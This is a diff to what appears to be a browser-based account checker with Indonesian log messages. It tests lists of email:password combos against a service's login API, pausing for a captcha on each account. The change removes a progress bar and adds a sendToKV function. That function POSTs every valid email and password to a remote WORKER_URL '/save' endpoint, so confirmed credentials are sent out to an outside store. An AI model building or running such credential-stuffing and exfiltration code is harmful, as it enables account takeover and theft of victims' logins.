@@ -105,32 +105,6 @@
   #log::-webkit-scrollbar { width: 8px; }
   #log::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
   #log::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
-
-  /* Progress Bar */
-  #progressBarContainer {
-    margin-top: 20px;
-    width: 100%;
-    background: #ddd;
-    border-radius: 25px;
-    height: 20px;
-  }
-
-  #progressBar {
-    height: 100%;
-    width: 0%;
-    background-color: #4caf50;
-    border-radius: 25px;
-    transition: width 0.3s ease;
-  }
-
-  #progressLabel {
-    position: absolute;
-    top: 0;
-    width: 100%;
-    text-align: center;
-    color: #fff;
-    font-weight: bold;
-  }
 </style>
 </head>
 <body>
@@ -147,11 +121,6 @@
 </div>
 
 <div id="status"></div>
-
-<div id="progressBarContainer">
-  <div id="progressBar"></div>
-  <div id="progressLabel">0%</div>
-</div>
 
 <div id="captcha-container">
   <div id="captcha-root-0"></div>
@@ -175,8 +144,6 @@ const statusEl = document.getElementById("status");
 const startBtn = document.getElementById("startBtn");
 const stopBtn = document.getElementById("stopBtn");
 const downloadBtn = document.getElementById("downloadBtn");
-const progressBar = document.getElementById("progressBar");
-const progressLabel = document.getElementById("progressLabel");
 
 function appendLog(text, cls) {
   const time = new Date().toLocaleTimeString();
@@ -185,12 +152,6 @@ function appendLog(text, cls) {
   if(cls) div.className = cls;
   logEl.appendChild(div);
   logEl.scrollTop = logEl.scrollHeight;
-}
-
-function updateProgressBar(totalCount, currentCount) {
-  const progress = ((totalCount - currentCount) / totalCount) * 100;
-  progressBar.style.width = `${progress}%`;
-  progressLabel.textContent = `${Math.round(progress)}%`;
 }
 
 function parseCombos(text) {
@@ -254,6 +215,18 @@ function showCaptcha(index) {
   });
 }
 
+async function sendToKV(account) {
+  try {
+    await fetch(WORKER_URL + "/save", {
+      method: "POST",
+      body: JSON.stringify(account),
+      headers: { "Content-Type": "application/json" }
+    });
+  } catch(e) {
+    console.error("Gagal kirim ke KV:", e);
+  }
+}
+
 async function checkOneAccount(account, index) {
   appendLog(`Minta captcha untuk ${account.email}`, "info");
   statusEl.textContent = `Checking ${account.email}`;
@@ -283,6 +256,7 @@ async function checkOneAccount(account, index) {
     if(data.code === 0 && data.data) {
       appendLog(`VALID => ${account.email}`, "ok");
       validAccounts.push(`${account.email}:${account.password}`);
+      sendToKV({ email: account.email, password: account.password });
     } else if(data.code === 1004) {
       appendLog(`NOT FOUND => ${account.email}`, "bad");
     } else if(data.code === 1005) {
@@ -294,6 +268,11 @@ async function checkOneAccount(account, index) {
   } catch(e) {
     appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
   }
+}
+
+function updateTextareaCombos() {
+  const remaining = combos.map(acc => `${acc.email}|${acc.password}`).join("\n");
+  document.getElementById("combo").value = remaining;
 }
 
 async function startProcess() {
@@ -313,15 +292,11 @@ async function startProcess() {
 
   appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`, "info");
 
-  const totalCount = combos.length;
-  let currentCount = 0;
-
   async function processCaptcha(index) {
     while (!stopRequested && combos.length > 0) {
       const account = combos.shift();
+      updateTextareaCombos();
       await checkOneAccount(account, index);
-      currentCount++;
-      updateProgressBar(totalCount, currentCount); // Update progress bar
     }
   }
 
